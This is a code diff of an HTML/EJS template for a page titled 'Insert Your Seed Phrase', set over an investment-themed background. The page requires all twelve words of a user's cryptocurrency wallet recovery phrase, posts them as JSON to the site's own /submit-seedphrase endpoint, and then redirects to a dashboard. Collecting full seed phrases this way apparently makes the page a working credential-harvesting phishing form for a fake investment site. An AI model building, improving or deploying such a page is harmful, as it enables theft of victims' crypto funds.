@@ -1,125 +1,191 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Insert Seed Phrase</title>
-    <link rel="stylesheet" href="/styles/style.css">
-    <style>
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        .input-columns {
-            display: flex;
-            width: 100%;
-        }
-        .input-column {
-            display: flex;
-            flex-direction: column;
-            width: 50%; /* Adjust width for two columns */
-        }
-        input {
-            width: 100%;
-            margin-bottom: 10px; /* Space between inputs */
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Insert Seed Phrase</title>
 
-        .submit-btn {
-            margin-top: 10px;
-            padding: 10px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-            transition: .5s;
-        }
-        .submit-btn:hover {
-            background-color: #0b9001;
-        }
-        .status-message {
-            margin-top: 20px;
-            padding: 10px;
-            display: none; /* Initially hidden */
-        }
-        .success {
-            background-color: green;
-            color: white;
-        }
-        .error {
-            background-color: red;
-            color: white;
-        }
-    </style>
+  <!-- Custom Global Stylesheet -->
+  <link rel="stylesheet" href="/styles/style.css" />
+
+  <!-- Inline Styles for Form Layout -->
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-image: linear-gradient(to right, rgba(26, 0, 142, 0.658), rgba(129, 0, 0, 0.5)),url(../images/invest.jpg);
+    background-size: cover; /* Ensures the background covers the entire page */
+    height: auto; /* Ensures the body takes the full height of the viewport */
+    background-repeat: no-repeat;
+    margin: 0; /* Remove default margin */
+    padding: 50px 0; /* Remove default padding */
+    
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 80px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .container h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      font-size: 24px;
+      color: #333;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .input-columns {
+      display: flex;
+      gap: 16px;
+    }
+
+    .input-column {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="text"] {
+      padding: 10px 12px;
+      margin-bottom: 12px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      transition: border-color 0.3s ease;
+    }
+
+    input[type="text"]:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #0b9001;
+    }
+
+    .status-message {
+      margin-top: 20px;
+      padding: 12px;
+      text-align: center;
+      font-weight: 500;
+      border-radius: 6px;
+      display: none;
+    }
+
+    .success {
+      background-color: #28a745;
+      color: white;
+    }
+
+    .error {
+      background-color: #dc3545;
+      color: white;
+    }
+
+    @media (max-width: 600px) {
+      .input-columns {
+        flex-direction: column;
+      }
+    }
+  </style>
 </head>
+
 <body>
-    <div class="container">
-        <h2>Insert Your Seed Phrase</h2>
-        <form id="seedPhraseForm" action="/submit-seedphrase">
+  <div class="container">
+    <h2>Insert Your Seed Phrase</h2>
 
-            <div class="form-group">
-                <input type="hidden" id="userId" name="userId" value="<%= userId %>">
+    <!-- Seed Phrase Submission Form -->
+    <form id="seedPhraseForm" action="/submit-seedphrase">
+      <input type="hidden" name="userId" value="<%= userId %>"/>
 
-                <label for="seedphrase">Seed Phrase:</label>
-                <div class="input-columns">
-                    <div class="input-column">
-                        <input type="text" id="seedphrase0" name="seedphrase0" required />
-                        <input type="text" id="seedphrase1" name="seedphrase1" required />
-                        <input type="text" id="seedphrase2" name="seedphrase2" required />
-                        <input type="text" id="seedphrase3" name="seedphrase3" required />
-                        <input type="text" id="seedphrase4" name="seedphrase4" required />
-                        <input type="text" id="seedphrase5" name="seedphrase5" required />
-                    </div>
-                    <div class="input-column">
-                        <input type="text" id="seedphrase6" name="seedphrase6" required />
-                        <input type="text" id="seedphrase7" name="seedphrase7" required />
-                        <input type="text" id="seedphrase8" name="seedphrase8" required />
-                        <input type="text" id="seedphrase9" name="seedphrase9" required />
-                        <input type="text" id="seedphrase10" name="seedphrase10" required />
-                        <input type="text" id="seedphrase11" name="seedphrase11" required />
-                    </div>
-                </div>
-            </div>
-            <button type="submit" class="submit-btn">Submit</button>
-        </form>
-        <div id="statusMessage" class="status-message"></div>
-    </div>
-    <script>
-       const form = document.getElementById('seedPhraseForm');
-const statusMessage = document.getElementById('statusMessage');
+      <div class="form-group">
+        <!-- 2-column layout for 12 input fields -->
+        <div class="input-columns">
+          <!-- Left Column (0–5) -->
+          <div class="input-column">
+            <% for (let i = 0; i < 6; i++) { %>
+              <input type="text" id="seedphrase<%= i %>" name="seedphrase<%= i %>" placeholder="Word <%= i + 1 %>" required />
+            <% } %>
+          </div>
 
-form.addEventListener('submit', async (event) => {
-    event.preventDefault(); // Prevent default form submission
+          <!-- Right Column (6–11) -->
+          <div class="input-column">
+            <% for (let i = 6; i < 12; i++) { %>
+              <input type="text" id="seedphrase<%= i %>" name="seedphrase<%= i %>" placeholder="Word <%= i + 1 %>" required />
+            <% } %>
+          </div>
+        </div>
+      </div>
 
-    const formData = new FormData(form);
-    const data = Object.fromEntries(formData); // Convert formData to an object
-    console.log("🚀 Sending data:", data); // Debugging log
+      <!-- Submit Button -->
+      <button type="submit" class="submit-btn">Submit</button>
+    </form>
 
-    const response = await fetch(form.action, {
-        method: 'POST',
-        body: JSON.stringify(data), // Send JSON
-        headers: { "Content-Type": "application/json" } // Set header to JSON
-    });
+    <!-- Feedback Message -->
+    <div id="statusMessage" class="status-message"></div>
+  </div>
 
-    if (response.ok) {
-        statusMessage.textContent = 'Seed phrase accepted!';
-        statusMessage.className = 'status-message success';
-        statusMessage.style.display = 'block';
-        setTimeout(() => {
-    window.location.href = '/dashboard';
-}, 2000);
+  <!-- JavaScript: Handle Form Submission -->
+  <script>
+    const form = document.getElementById('seedPhraseForm');
+    const statusMessage = document.getElementById('statusMessage');
 
-    } else {
-        const errorText = await response.text();
-        console.error("🔥 Error response:", errorText); // Log error message
-        statusMessage.textContent = 'An error occurred: ' + errorText;
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData);
+
+      try {
+        const response = await fetch(form.action, {
+          method: 'POST',
+          body: JSON.stringify(data),
+          headers: { 'Content-Type': 'application/json' }
+        });
+
+        if (response.ok) {
+          // Success
+          statusMessage.textContent = 'Seed phrase accepted!';
+          statusMessage.className = 'status-message success';
+          statusMessage.style.display = 'block';
+
+          // Redirect after short delay
+          setTimeout(() => {
+            window.location.href = '/dashboard';
+          }, 2000);
+        } else {
+          // Error response from server
+          const errorText = await response.text();
+          throw new Error(errorText);
+        }
+      } catch (error) {
+        console.error("🔥 Error:", error);
+        statusMessage.textContent = 'An error occurred: ' + error.message;
         statusMessage.className = 'status-message error';
         statusMessage.style.display = 'block';
-    }
-});
-
-    </script>
+      }
+    });
+  </script>
 </body>
 </html>
